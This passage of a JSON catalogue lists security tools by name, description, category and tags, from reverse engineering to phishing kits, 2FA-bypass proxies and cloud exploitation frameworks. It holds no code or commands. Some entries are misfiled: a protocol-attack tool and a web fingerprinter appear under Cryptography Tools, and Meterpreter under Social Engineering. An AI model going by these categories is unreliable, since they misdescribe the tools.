      "debugger",
      "cli"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Cutter",
    "description": "A GUI for Radare2.",
    "category": "Reverse Engineering",
    "tags": [
      "radare2",
      "gui",
      "disassembler"
    ],
    "color": "#9be54b"
  },
  {
    "name": "x64dbg",
    "description": "An open-source x64/x32 debugger for Windows.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "windows",
      "dynamic analysis"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "OllyDbg",
    "description": "A 32-bit assembler level analysing debugger for Microsoft Windows.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "windows",
      "x86"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Immunity Debugger",
    "description": "A powerful way to write exploits, analyze malware, and reverse engineer binary files.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "exploit development",
      "python scripting"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "WinDbg",
    "description": "A multipurpose debugger for Microsoft Windows.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "windows",
      "kernel debugging"
    ],
    "color": "#4be575"
  },
  {
    "name": "Binary Ninja",
    "description": "A commercial reverse engineering platform.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
      "intermediate language",
      "commercial"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Hopper Disassembler",
    "description": "A reverse engineering tool for macOS and Linux.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
      "decompiler",
      "osx"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Angr",
    "description": "A platform-agnostic binary analysis framework.",
    "category": "Reverse Engineering",
    "tags": [
      "binary analysis",
      "symbolic execution",
      "python"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Binwalk",
    "description": "A fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images.",
    "category": "Reverse Engineering",
    "tags": [
      "firmware analysis",
      "extraction",
      "entropy analysis"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "GDB",
    "description": "The GNU Project debugger.",
    "category": "Reverse Engineering",
    "tags": [
      "debugger",
      "linux",
      "cli"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Valgrind",
    "description": "An instrumentation framework for building dynamic analysis tools.",
    "category": "Reverse Engineering",
    "tags": [
      "dynamic analysis",
      "memory profiling",
      "linux"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Frida",
    "description": "A dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.",
    "category": "Reverse Engineering",
    "tags": [
      "dynamic instrumentation",
      "hooking",
      "scriptable"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Apktool",
    "description": "A tool for reverse engineering Android apk files.",
    "category": "Reverse Engineering",
    "tags": [
      "android",
      "apk",
      "decompiling"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Jadx",
    "description": "A Dex to Java decompiler for Android.",
    "category": "Reverse Engineering",
    "tags": [
      "android",
      "dex",
      "decompiler",
      "gui"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "dnSpy",
    "description": "A .NET debugger and assembly editor.",
    "category": "Reverse Engineering",
    "tags": [
      ".net",
      "debugger",
      "assembly editor"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "ILSpy",
    "description": "An open-source .NET assembly browser and decompiler.",
    "category": "Reverse Engineering",
    "tags": [
      ".net",
      "decompiler",
      "assembly browser"
    ],
    "color": "#75e54b"
  },
  {
    "name": "PE-bear",
    "description": "A freeware portable executable (PE) file explorer.",
    "category": "Reverse Engineering",
    "tags": [
      "pe file",
      "windows",
      "static analysis"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "OpenSSL",
    "description": "A robust, commercial-grade, and full-featured toolkit for the TLS and SSL protocols.",
    "category": "Cryptography Tools",
    "tags": [
      "ssl",
      "tls",
      "encryption",
      "certificates"
    ],
    "color": "#c34be5"
  },
  {
    "name": "GnuPG (GPG)",
    "description": "A complete and free implementation of the OpenPGP standard.",
    "category": "Cryptography Tools",
    "tags": [
      "pgp",
      "encryption",
      "signing",
      "privacy"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "CrypTool",
    "description": "An open-source e-learning application used in the implementation and analysis of cryptographic algorithms.",
    "category": "Cryptography Tools",
    "tags": [
      "cryptanalysis",
      "education",
      "visualization"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "FeatherDuster",
    "description": "An automated, modular cryptanalysis tool.",
    "category": "Cryptography Tools",
    "tags": [
      "cryptanalysis",
      "classical ciphers",
      "automation"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Cryptcat",
    "description": "A lightweight version of netcat with twofish encryption.",
    "category": "Cryptography Tools",
    "tags": [
      "encrypted chat",
      "netcat",
      "twofish"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Keyczar",
    "description": "An open source cryptographic toolkit designed to make it easier and safer for developers to use cryptography.",
    "category": "Cryptography Tools",
    "tags": [
      "crypto library",
      "key management",
      "api"
    ],
    "color": "#4be575"
  },
  {
    "name": "Certbot",
    "description": "A free, open source software tool for automatically using Let's Encrypt certificates.",
    "category": "Cryptography Tools",
    "tags": [
      "ssl",
      "tls",
      "letsencrypt",
      "automation"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Aescrypt",
    "description": "A file encryption software that uses the AES-256 algorithm.",
    "category": "Cryptography Tools",
    "tags": [
      "file encryption",
      "aes",
      "cross-platform"
    ],
    "color": "#9be54b"
  },
  {
    "name": "VeraCrypt",
    "description": "A free open source disk encryption software for Windows, Mac OSX and Linux.",
    "category": "Cryptography Tools",
    "tags": [
      "disk encryption",
      "fde",
      "plausible deniability"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "LUKS",
    "description": "Linux Unified Key Setup, the standard for Linux hard disk encryption.",
    "category": "Cryptography Tools",
    "tags": [
      "disk encryption",
      "linux",
      "dm-crypt"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Bcrypt",
    "description": "A password hashing function based on the Blowfish cipher.",
    "category": "Cryptography Tools",
    "tags": [
      "password hashing",
      "key stretching"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Scrypt",
    "description": "A password-based key derivation function.",
    "category": "Cryptography Tools",
    "tags": [
      "password hashing",
      "kdf",
      "memory-hard"
    ],
    "color": "#4be575"
  },
  {
    "name": "pkcs11-tool",
    "description": "A tool for managing keys and certificates on PKCS#11 devices.",
    "category": "Cryptography Tools",
    "tags": [
      "hsm",
      "smart card",
      "pkcs11"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "sslscan",
    "description": "A tool to test SSL/TLS enabled services to discover supported cipher suites.",
    "category": "Cryptography Tools",
    "tags": [
      "ssl",
      "tls",
      "cipher suite",
      "scanner"
    ],
    "color": "#9be54b"
  },
  {
    "name": "testssl.sh",
    "description": "A free command line tool which checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as cryptographic flaws.",
    "category": "Cryptography Tools",
    "tags": [
      "ssl",
      "tls",
      "vulnerability scanner",
      "bash"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Yersinia",
    "description": "A network tool designed to take advantage of some weakeness in different network protocols.",
    "category": "Cryptography Tools",
    "tags": [
      "network protocol attacks",
      "cisco",
      "layer 2"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Httprint",
    "description": "A web server fingerprinting tool.",
    "category": "Cryptography Tools",
    "tags": [
      "fingerprinting",
      "web server",
      "signature-based"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Crypton",
    "description": "A tool for encrypting and decrypting files and messages.",
    "category": "Cryptography Tools",
    "tags": [
      "encryption",
      "cli",
      "aes"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Steghide",
    "description": "A steganography program that hides data in various kinds of image- and audio-files.",
    "category": "Cryptography Tools",
    "tags": [
      "steganography",
      "data hiding"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Outguess",
    "description": "A universal steganographic tool.",
    "category": "Cryptography Tools",
    "tags": [
      "steganography",
      "data hiding"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Maltego",
    "description": "A tool for open-source intelligence and forensics.",
    "category": "OSINT",
    "tags": [
      "data mining",
      "visualization",
      "link analysis"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "theHarvester",
    "description": "A tool for gathering subdomain names, e-mail addresses, virtual hosts, open ports/banners, and employee names from different public sources.",
    "category": "OSINT",
    "tags": [
      "email gathering",
      "subdomain enumeration"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Shodan",
    "description": "A search engine for Internet-connected devices.",
    "category": "OSINT",
    "tags": [
      "iot",
      "search engine",
      "device discovery"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Recon-ng",
    "description": "A full-featured Web Reconnaissance framework written in Python.",
    "category": "OSINT",
    "tags": [
      "web reconnaissance",
      "framework",
      "automation"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "SpiderFoot",
    "description": "An open source intelligence (OSINT) automation tool.",
    "category": "OSINT",
    "tags": [
      "automation",
      "data correlation",
      "reconnaissance"
    ],
    "color": "#c34be5"
  },
  {
    "name": "Google Dorks",
    "description": "Advanced Google searching techniques to find information.",
    "category": "OSINT",
    "tags": [
      "google hacking",
      "search operators",
      "information leakage"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "TinEye",
    "description": "A reverse image search engine.",
    "category": "OSINT",
    "tags": [
      "reverse image search",
      "image analysis"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Creepy",
    "description": "A geolocation OSINT tool.",
    "category": "OSINT",
    "tags": [
      "geolocation",
      "social media",
      "tracking"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Metagoofil",
    "description": "An information gathering tool designed for extracting metadata of public documents.",
    "category": "OSINT",
    "tags": [
      "metadata extraction",
      "document analysis"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "FOCA",
    "description": "Fingerprinting Organizations with Collected Archives, a tool used mainly to find metadata and hidden information in the documents it scans.",
    "category": "OSINT",
    "tags": [
      "metadata",
      "document analysis",
      "network discovery"
    ],
    "color": "#4be575"
  },
  {
    "name": "Censys",
    "description": "A platform that helps researchers understand the hosts and networks that compose the global Internet.",
    "category": "OSINT",
    "tags": [
      "internet scan",
      "network data",
      "research"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "ZoomEye",
    "description": "A cyberspace search engine to find specific network assets.",
    "category": "OSINT",
    "tags": [
      "search engine",
      "network assets",
      "iot"
    ],
    "color": "#9be54b"
  },
  {
    "name": "GHDB",
    "description": "Google Hacking Database, an index of search queries (dorks) used to find publicly available information.",
    "category": "OSINT",
    "tags": [
      "google dorks",
      "database",
      "vulnerabilities"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "OSINT Framework",
    "description": "A web-based framework for navigating the vast world of OSINT resources.",
    "category": "OSINT",
    "tags": [
      "resource directory",
      "mind map",
      "osint tools"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Twint",
    "description": "An advanced Twitter scraping tool.",
    "category": "OSINT",
    "tags": [
      "twitter",
      "data scraping",
      "social media"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Sherlock",
    "description": "Hunt down social media accounts by username across social networks.",
    "category": "OSINT",
    "tags": [
      "username search",
      "social media",
      "profiling"
    ],
    "color": "#4be575"
  },
  {
    "name": "Photon",
    "description": "An incredibly fast crawler which extracts URLs, emails, files, website accounts and much more.",
    "category": "OSINT",
    "tags": [
      "web crawler",
      "data extraction",
      "reconnaissance"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "BuiltWith",
    "description": "A website profiler tool that finds out the technology stack of any website.",
    "category": "OSINT",
    "tags": [
      "technology profiling",
      "web analysis",
      "fingerprinting"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Wayback Machine",
    "description": "A digital archive of the World Wide Web.",
    "category": "OSINT",
    "tags": [
      "website archive",
      "historical data",
      "reconnaissance"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Netcraft",
    "description": "An internet services company that provides web server and web hosting market-share analysis.",
    "category": "OSINT",
    "tags": [
      "site report",
      "phishing protection",
      "web analysis"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Cuckoo Sandbox",
    "description": "An automated dynamic malware analysis system.",
    "category": "Malware Analysis",
    "tags": [
      "sandbox",
      "dynamic analysis",
      "automation"
    ],
    "color": "#56e54b"
  },
  {
    "name": "YARA",
    "description": "The pattern matching swiss knife for malware researchers.",
    "category": "Malware Analysis",
    "tags": [
      "pattern matching",
      "malware identification",
      "rules"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "PEid",
    "description": "A tool that detects most common packers, cryptors and compilers for PE files.",
    "category": "Malware Analysis",
    "tags": [
      "packer detection",
      "pe file",
      "static analysis"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Process Hacker",
    "description": "A powerful multi-purpose tool that helps you monitor system resources, debug software and detect malware.",
    "category": "Malware Analysis",
    "tags": [
      "process monitoring",
      "system analysis",
      "debugging"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "ProcMon",
    "description": "Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity.",
    "category": "Malware Analysis",
    "tags": [
      "process monitoring",
      "registry",
      "file system"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Regshot",
    "description": "An open-source registry compare utility that allows you to take a snapshot of your registry.",
    "category": "Malware Analysis",
    "tags": [
      "registry analysis",
      "snapshot",
      "comparison"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "INetSim",
    "description": "A software suite for simulating common internet services in a lab environment.",
    "category": "Malware Analysis",
    "tags": [
      "network simulation",
      "malware lab",
      "service emulation"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Fakenet-NG",
    "description": "A next generation dynamic network analysis tool for malware analysts and penetration testers.",
    "category": "Malware Analysis",
    "tags": [
      "network simulation",
      "dynamic analysis",
      "pcap"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "BinText",
    "description": "A small, very fast and powerful text extractor that can be of particular interest to programmers.",
    "category": "Malware Analysis",
    "tags": [
      "string extraction",
      "static analysis",
      "binary"
    ],
    "color": "#c34be5"
  },
  {
    "name": "UPX",
    "description": "The Ultimate Packer for eXecutables.",
    "category": "Malware Analysis",
    "tags": [
      "packer",
      "unpacker",
      "executable compression"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Remnux",
    "description": "A Linux toolkit for reverse-engineering and analyzing malicious software.",
    "category": "Malware Analysis",
    "tags": [
      "malware analysis distro",
      "toolkit",
      "reverse engineering"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "VirusTotal",
    "description": "A free service that analyzes files and URLs for viruses, worms, trojans and other kinds of malicious content.",
    "category": "Malware Analysis",
    "tags": [
      "online scanner",
      "multi-av",
      "reputation"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Hybrid Analysis",
    "description": "A free malware analysis service that detects and analyzes unknown threats using a unique Hybrid Analysis technology.",
    "category": "Malware Analysis",
    "tags": [
      "online sandbox",
      "threat intelligence",
      "static analysis"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Any.Run",
    "description": "An interactive online malware analysis service.",
    "category": "Malware Analysis",
    "tags": [
      "interactive sandbox",
      "online analysis",
      "dynamic analysis"
    ],
    "color": "#4be575"
  },
  {
    "name": "ThreatCrowd",
    "description": "A search engine for threats.",
    "category": "Malware Analysis",
    "tags": [
      "threat intelligence",
      "osint",
      "correlation"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Joe Sandbox",
    "description": "A commercial deep malware analysis platform.",
    "category": "Malware Analysis",
    "tags": [
      "sandbox",
      "dynamic analysis",
      "commercial"
    ],
    "color": "#9be54b"
  },
  {
    "name": "pestudio",
    "description": "A tool for static analysis of malicious Windows executables.",
    "category": "Malware Analysis",
    "tags": [
      "static analysis",
      "pe file",
      "indicators"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Fiddler",
    "description": "A free web debugging proxy for any browser, system or platform.",
    "category": "Malware Analysis",
    "tags": [
      "proxy",
      "http debugging",
      "network traffic"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Sysinternals Suite",
    "description": "A suite of technical utilities to manage, diagnose, troubleshoot and monitor a Microsoft Windows environment.",
    "category": "Malware Analysis",
    "tags": [
      "windows",
      "system utilities",
      "troubleshooting"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Mandiant Redline",
    "description": "Provides host investigative capabilities to users to find signs of malicious activity through memory and file analysis.",
    "category": "Malware Analysis",
    "tags": [
      "incident response",
      "memory forensics",
      "ioc"
    ],
    "color": "#4be575"
  },
  {
    "name": "Gophish",
    "description": "An open-source phishing toolkit.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "campaign management",
      "awareness training"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "CredSniper",
    "description": "A phishing framework written in Python with a web front-end.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "credential harvesting",
      "automation"
    ],
    "color": "#9be54b"
  },
  {
    "name": "King Phisher",
    "description": "A phishing campaign toolkit used for creating and managing multiple simultaneous phishing attacks.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "campaigns",
      "server"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Evilginx2",
    "description": "A man-in-the-middle attack framework used for phishing login credentials along with session cookies.",
    "category": "Social Engineering",
    "tags": [
      "mitm",
      "phishing",
      "2fa bypass"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Modlishka",
    "description": "A flexible and powerful reverse proxy, that will take your phishing campaigns to the next level.",
    "category": "Social Engineering",
    "tags": [
      "reverse proxy",
      "phishing",
      "2fa bypass"
    ],
    "color": "#56e54b"
  },
  {
    "name": "BlackEye",
    "description": "A complete phishing tool with 32 templates + 1 customizable.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "templates",
      "credential harvesting"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Shellphish",
    "description": "A phishing tool for 18 social media sites.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "social media",
      "templates"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Zphisher",
    "description": "An automated phishing tool with 30+ templates.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "automation",
      "templates"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "PhoneInfoga",
    "description": "An advanced information gathering tool for phone numbers.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "phone number",
      "reconnaissance"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "UserRecon",
    "description": "Find usernames across over 75 social networks.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "username search",
      "social media"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "FinalRecon",
    "description": "A fast and simple python script for web reconnaissance.",
    "category": "Social Engineering",
    "tags": [
      "reconnaissance",
      "web",
      "osint"
    ],
    "color": "#75e54b"
  },
  {
    "name": "DNSChef",
    "description": "A highly configurable DNS proxy for pentesters.",
    "category": "Social Engineering",
    "tags": [
      "dns proxy",
      "phishing",
      "network attacks"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "Meterpreter",
    "description": "An advanced, dynamically extensible payload that uses in-memory DLL injection stagers.",
    "category": "Social Engineering",
    "tags": [
      "payload",
      "metasploit",
      "post-exploitation"
    ],
    "color": "#c34be5"
  },
  {
    "name": "USB Rubber Ducky",
    "description": "A keystroke injection tool disguised as a generic USB thumb drive.",
    "category": "Social Engineering",
    "tags": [
      "hardware",
      "keystroke injection",
      "payload delivery"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Bash Bunny",
    "description": "A multi-function USB attack and automation platform.",
    "category": "Social Engineering",
    "tags": [
      "hardware",
      "usb attack",
      "automation"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Catphish",
    "description": "A tool for creating phishing websites that are difficult to detect.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "web",
      "evasion"
    ],
    "color": "#e54b75"
  },
  {
    "name": "EvilURL",
    "description": "Generate unicode evil domains for IDN Homograph Attack and detect them.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "homograph attack",
      "url manipulation"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Sputnik",
    "description": "A tool to find email addresses and social media profiles of a person.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "email",
      "social media"
    ],
    "color": "#4be575"
  },
  {
    "name": "DaProfiler",
    "description": "A tool for finding social media accounts associated with an email or phone number.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "profiling",
      "social media"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Tinfoleak",
    "description": "A tool that automates the extraction of information on Twitter.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "twitter",
      "data extraction"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Prowler",
    "description": "A command line tool for AWS security assessment, auditing, hardening and incident response.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "security audit",
      "cis benchmarks"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "ScoutSuite",
    "description": "A multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.",
    "category": "Cloud Security",
    "tags": [
      "multi-cloud",
      "audit",
      "aws",
      "gcp",
      "azure"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Pacu",
    "description": "An open-source AWS exploitation framework.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "exploitation",
      "post-exploitation"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "CloudSploit",
    "description": "An open-source project to detect security risks in cloud infrastructure accounts.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "azure",
      "gcp",
      "security scanner"
    ],
    "color": "#4be575"
  },
  {
    "name": "CloudMapper",
    "description": "Helps you analyze your Amazon Web Services (AWS) environments.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "network visualization",
      "audit"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "PMapper",
    "description": "A tool for identifying risks in AWS IAM configurations.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "iam",
      "privilege escalation"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Cartography",
    "description": "A Python tool that consolidates infrastructure assets and the relationships between them in an intuitive graph view.",
    "category": "Cloud Security",
    "tags": [
      "asset inventory",
      "graph database",
      "multi-cloud"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Falco",
    "description": "A cloud native runtime security project, the de facto Kubernetes threat detection engine.",
    "category": "Cloud Security",
    "tags": [
      "kubernetes",
      "runtime security",
      "threat detection"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Trivy",
    "description": "A simple and comprehensive vulnerability scanner for containers and other artifacts.",
    "category": "Cloud Security",
    "tags": [
      "container security",
      "vulnerability scanner",
      "ci/cd"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Kube-bench",
    "description": "Checks whether Kubernetes is deployed securely by running the checks documented in the CIS Kubernetes Benchmark.",
    "category": "Cloud Security",
    "tags": [
      "kubernetes",
      "cis benchmarks",
      "security audit"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Checkov",
    "description": "A static code analysis tool for infrastructure-as-code.",
    "category": "Cloud Security",
    "tags": [
      "iac",
      "terraform",
      "cloudformation",
      "static analysis"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Terrascan",
    "description": "A static code analyzer for Infrastructure as Code to detect security vulnerabilities and compliance violations.",
    "category": "Cloud Security",
    "tags": [
      "iac",
      "security scanner",
      "compliance"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Cloud Custodian",
    "description": "A rules engine for managing public cloud accounts and resources.",
    "category": "Cloud Security",
    "tags": [
      "cloud governance",
      "automation",
      "compliance"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Steampipe",
    "description": "Use SQL to instantly query your cloud APIs.",
    "category": "Cloud Security",
    "tags": [
      "cloud query",
      "sql",
      "api",
      "audit"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "WeirdAAL",
    "description": "AWS Attack Library for generating IAM policies that allow certain AWS attacks.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "iam",
      "attack simulation"
    ],
    "color": "#75e54b"
  },
  {
    "name": "CloudGoat",
    "description": "A \"Vulnerable by Design\" AWS deployment tool.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "vulnerable environment",
      "training"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "ElectricEye",
    "description": "Continuously monitors AWS services for configurations that can lead to degradation of security.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "security audit",
      "monitoring"
    ],
    "color": "#c34be5"
  },
  {
    "name": "CloudQuery",
    "description": "An open-source cloud asset inventory powered by SQL.",
    "category": "Cloud Security",
    "tags": [
      "asset inventory",
      "sql",
      "multi-cloud"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Kube-hunter",
    "description": "Hunts for security weaknesses in Kubernetes clusters.",
    "category": "Cloud Security",
    "tags": [
      "kubernetes",
      "pentesting",
      "vulnerability scanner"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Peirates",
    "description": "A Kubernetes penetration tool.",
    "category": "Cloud Security",
    "tags": [
      "kubernetes",
      "pentesting",
      "post-exploitation"
    ],
    "color": "#e54b75"
  }
]